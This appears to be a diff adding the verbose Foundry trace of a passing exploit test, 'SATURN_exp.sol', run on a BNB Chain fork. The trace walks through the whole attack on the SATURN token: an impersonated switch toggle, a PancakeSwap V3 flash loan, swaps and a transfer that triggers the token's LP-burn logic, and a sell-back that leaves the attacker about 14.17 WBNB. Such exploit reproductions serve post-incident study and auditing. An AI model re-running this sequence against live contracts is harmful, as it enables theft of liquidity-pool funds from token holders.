@@ -1,0 +1,184 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SATURN_exp.sol:ContractTest
+[PASS] testExploit() (gas: 445300)
+Logs:
+  Attacker WBNB Balance Before exploit: 0.000000000000000000
+  Attacker WBNB Balance After exploit: 14.169439777820443969
+
+Traces:
+  [13642] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 38488208 [3.848e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(SATURN: [0x9BDF251435cBC6774c7796632e9C80B233055b93], "SATURN")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], "PancakeSwap Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], "pair_WBNB_SATURN")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050], "pancakeV3Pool")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [466900] ContractTest::testExploit()
+    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB Balance Before exploit", val: 0, decimals: 18)
+    ├─ [24657] SATURN::approve(PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x44bf1039324fcbfda472196706fa68525cb38db0f3d91f5ca7d489ff92357e45: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [24420] WBNB::approve(PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x0072fde0c25a54a99a0517f551c3cabc4c49d9ef3648fd789a3f57d0243cdb90: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [0] VM::prank(0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62)
+    │   └─ ← [Return]
+    ├─ [7576] SATURN::setEnableSwitch(false)
+    │   ├─  storage changes:
+    │   │   @ 36: 1 → 0
+    │   └─ ← [Stop]
+    ├─ [0] VM::startPrank(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC)
+    │   └─ ← [Return]
+    ├─ [2625] SATURN::balanceOf(0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC) [staticcall]
+    │   └─ ← [Return] 891000891000000032818675 [8.91e23]
+    ├─ [28009] SATURN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 891000891000000032818675 [8.91e23])
+    │   ├─ emit Transfer(from: 0xfcECDBC62DEe7233E1c831D06653b5bEa7845FcC, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 891000891000000032818675 [8.91e23])
+    │   ├─  storage changes:
+    │   │   @ 0x28d9c3c3324c2aecd3cfb2a0e56c23d9d16aabbc7af238f53d1fb547d2998733: 0x00000000000000000000000000000000000000000000bcad414d477557b445f3 → 0
+    │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000bcad414d477557b445f3
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62)
+    │   └─ ← [Return]
+    ├─ [776] SATURN::setEnableSwitch(true)
+    │   ├─  storage changes:
+    │   │   @ 36: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [337178] pancakeV3Pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 3300000000000000000000 [3.3e21], 0x)
+    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]) [staticcall]
+    │   │   └─ ← [Return] 40870289996139081561412945 [4.087e25]
+    │   ├─ [2534] WBNB::balanceOf(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]) [staticcall]
+    │   │   └─ ← [Return] 16301292770116353018232 [1.63e22]
+    │   ├─ [25962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3300000000000000000000 [3.3e21])
+    │   │   ├─ emit Transfer(from: pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3300000000000000000000 [3.3e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000b2e4b323d9c5100000
+    │   │   │   @ 0xf398c0878886fbe9ddcca4240ffdc3ab6a71e3d8caebbc2d009dac30c6555b68: 0x000000000000000000000000000000000000000000000373b1e1ce785ca64978 → 0x0000000000000000000000000000000000000000000002c0cd2eaa9e97964978
+    │   │   └─ ← [Return] true
+    │   ├─ [275310] ContractTest::pancakeV3FlashCallback(0, 1650000000000000000 [1.65e18], 0x)
+    │   │   ├─ [2429] SATURN::everyTimeSellLimitAmount()
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000069e10de76676d0800000
+    │   │   ├─ [2625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   └─ ← [Return] 101530461164515912233363838 [1.015e26]
+    │   │   ├─ [9691] PancakeSwap Router::getAmountsIn(101030461164515912233363838 [1.01e26], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x9BDF251435cBC6774c7796632e9C80B233055b93]) [staticcall]
+    │   │   │   ├─ [2893] pair_WBNB_SATURN::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 101530461164515912233363838 [1.015e26], 15819439777820444294 [1.581e19], 1715008151 [1.715e9]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000adb7658b8896d72d1e000000000000000000000000000000000000000000539208462ab2cec765a97e
+    │   │   ├─ [76172] PancakeSwap Router::swapExactTokensForTokens(3204501846852103515422 [3.204e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x9BDF251435cBC6774c7796632e9C80B233055b93], 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [893] pair_WBNB_SATURN::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 101530461164515912233363838 [1.015e26], 15819439777820444294 [1.581e19], 1715008151 [1.715e9]
+    │   │   │   ├─ [8225] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], 3204501846852103515422 [3.204e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], value: 3204501846852103515422 [3.204e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x7651e332333a664dea746bd87ceb125750faba70bfdddc3ecd2d5931aff5c809: 0x000000000000000000000000000000000000000000000000db89f0a9b6ac0686 → 0x0000000000000000000000000000000000000000000000ae92ef7c324d8333a4
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000b2e4b323d9c5100000 → 0x0000000000000000000000000000000000000000000000052d4d98512e38d2e2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [58585] pair_WBNB_SATURN::swap(101030461164515912233363897 [1.01e26], 0, 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62, 0x)
+    │   │   │   │   ├─ [34598] SATURN::transfer(0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62, 101030461164515912233363897 [1.01e26])
+    │   │   │   │   │   ├─ emit Transfer(from: pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], to: 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62, value: 101030461164515912233363897 [1.01e26])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb5bb561cbca1a849a4b4c2c3c214529a25c29769f8df64561ee55a02d0731361: 0x00000000000000000000000000000000000000000053fbe95412194597e5a97e → 0x0000000000000000000000000000000000000000000069e10de76676d07fffc5
+    │   │   │   │   │   │   @ 0x77bfa8f136bc6a4b0f347bac2e7ac9d98cc5fd396e0f4d6e0500b64cd0677c8b: 0 → 0x000000000000000000000000000000000000000000539208462ab2cec765a9b9
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 499999999999999999999941 [4.999e23]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3220321286629923959716 [3.22e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 499999999999999999999941 [4.999e23], reserve1: 3220321286629923959716 [3.22e21])
+    │   │   │   │   ├─ emit Swap(sender: PancakeSwap Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 3204501846852103515422 [3.204e21], amount0Out: 101030461164515912233363897 [1.01e26], amount1Out: 0, to: 0xc8Ce1ecDfb7be4c5a661DEb6C1664Ab98df3Cd62)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6638f297000000000000db89f0a9b6ac068600000053fbe95412194597e5a97e → 0x6638f2970000000000ae92ef7c324d8333a40000000069e10de76676d07fffc5
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000adb7658b8896d72d1e000000000000000000000000000000000000000000539208462ab2cec765a9b9
+    │   │   ├─ [625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   └─ ← [Return] 499999999999999999999941 [4.999e23]
+    │   │   ├─ [0] VM::roll(38488209 [3.848e7])
+    │   │   │   └─ ← [Return]
+    │   │   ├─ [129266] SATURN::transfer(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], 228832951945080091523153 [2.288e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6F8d958c4DbA9CdD734bb1C435F23cD6aa35534A, value: 11441647597254004576157 [1.144e22])
+    │   │   │   ├─ emit ProcessBlockOverflow(param0: 38488209 [3.848e7], param1: 499999999999999999999941 [4.999e23])
+    │   │   │   ├─ emit Transfer(from: pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], to: 0x0000000000000000000000000000000000000000, value: 499999999999999999978090 [4.999e23])
+    │   │   │   ├─ [9071] pair_WBNB_SATURN::sync()
+    │   │   │   │   ├─ [625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 21851 [2.185e4]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3220321286629923959716 [3.22e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 21851 [2.185e4], reserve1: 3220321286629923959716 [3.22e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x6638f2970000000000ae92ef7c324d8333a40000000069e10de76676d07fffc5 → 0x6638f2970000000000ae92ef7c324d8333a4000000000000000000000000555b
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit AutoNukeLP()
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], value: 217391304347826086946996 [2.173e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x292bc0c79cc4b78411d76fa3cd854f906acf579efad039bb31ab26e402e24c3e: 0 → 0x0000000000000000000000000000000000000000000069e10de76676d07faa6a
+    │   │   │   │   @ 33: 0x00000000000000000000000000000000000000000230f25cf696f5d2422c9031 → 0x000000000000000000000000000000000000000002315c3e047e5c4912ac3a9b
+    │   │   │   │   @ 0xb5bb561cbca1a849a4b4c2c3c214529a25c29769f8df64561ee55a02d0731361: 0x0000000000000000000000000000000000000000000069e10de76676d07fffc5 → 0x000000000000000000000000000000000000000000002e08ce649bda9d6f7e0f
+    │   │   │   │   @ 0x9fc23bd4b9367f0f51f9f6403745e088d78a6c41794959e70d39055f20455411: 0 → 0x00000000000000000000000000000000000000000000026c40c1ed41669a0f9d
+    │   │   │   │   @ 0xb6a921b4b6705a559c673bbf4e678ea61771eae5db17b05a083503e2de55421d: 0 → 0x0000000000000000000000000000000000000000000069e10de76676d07fffc5
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000bcad414d477557b445f3 → 0x000000000000000000000000000000000000000000008c383226be5953ab0da2
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000ef64936b5c7488bdedabcf → 0x000000000000000000000000000000000000000000eefab25d750e11ed6e0165
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [893] pair_WBNB_SATURN::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 21851 [2.185e4], 3220321286629923959716 [3.22e21], 1715008151 [1.715e9]
+    │   │   ├─ [625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   └─ ← [Return] 217391304347826086968847 [2.173e23]
+    │   │   ├─ [5111] PancakeSwap Router::getAmountsOut(217391304347826086946996 [2.173e23], [0x9BDF251435cBC6774c7796632e9C80B233055b93, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   ├─ [893] pair_WBNB_SATURN::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 21851 [2.185e4], 3220321286629923959716 [3.22e21], 1715008151 [1.715e9]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000002e08ce649bda9d6f28b40000000000000000000000000000000000000000000000ae92ef7c324d83325f
+    │   │   ├─ [18449] pair_WBNB_SATURN::swap(0, 3220321286629923959391 [3.22e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [3262] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3220321286629923959391 [3.22e21])
+    │   │   │   │   ├─ emit Transfer(from: pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3220321286629923959391 [3.22e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000052d4d98512e38d2e2 → 0x0000000000000000000000000000000000000000000000b3c03d14837bbc0541
+    │   │   │   │   │   @ 0x7651e332333a664dea746bd87ceb125750faba70bfdddc3ecd2d5931aff5c809: 0x0000000000000000000000000000000000000000000000ae92ef7c324d8333a4 → 325
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [625] SATURN::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   └─ ← [Return] 217391304347826086968847 [2.173e23]
+    │   │   │   ├─ [534] WBNB::balanceOf(pair_WBNB_SATURN: [0x49BA6c20D3e95374fc1b19D537884b5595AA6124]) [staticcall]
+    │   │   │   │   └─ ← [Return] 325
+    │   │   │   ├─ emit Sync(reserve0: 217391304347826086968847 [2.173e23], reserve1: 325)
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 217391304347826086946996 [2.173e23], amount1In: 0, amount0Out: 0, amount1Out: 3220321286629923959391 [3.22e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6638f2970000000000ae92ef7c324d8333a4000000000000000000000000555b → 0x6638f2970000000000000000000000000145000000002e08ce649bda9d6f7e0f
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WBNB::transfer(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050], 3301650000000000000000 [3.301e21])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050], value: 3301650000000000000000 [3.301e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000b3c03d14837bbc0541 → 0x000000000000000000000000000000000000000000000000c4a3f667af470541
+    │   │   │   │   @ 0xf398c0878886fbe9ddcca4240ffdc3ab6a71e3d8caebbc2d009dac30c6555b68: 0x0000000000000000000000000000000000000000000002c0cd2eaa9e97964978 → 0x000000000000000000000000000000000000000000000373c8c7c8ba640b4978
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]) [staticcall]
+    │   │   └─ ← [Return] 40870289996139081561412945 [4.087e25]
+    │   ├─ [534] WBNB::balanceOf(pancakeV3Pool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]) [staticcall]
+    │   │   └─ ← [Return] 16302942770116353018232 [1.63e22]
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 0, amount1: 3300000000000000000000 [3.3e21], paid0: 0, paid1: 1650000000000000000 [1.65e18])
+    │   ├─  storage changes:
+    │   │   @ 3: 0x00000000000000000000000000000000004743bb00596d81933e02bbddb61b0f → 0x00000000000000000000000000000000004746ffb5151cb9953e8837ce07c650
+    │   │   @ 4: 0x00000000000000011c1a61b1df4313e0000000000000029561075760b169c638 → 0x000000000000000123e37438f64193e0000000000000029561075760b169c638
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 14169439777820443969 [1.416e19]
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB Balance After exploit", val: 14169439777820443969 [1.416e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.17s (11.24s CPU time)
+
+Ran 1 test suite in 14.99s (12.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
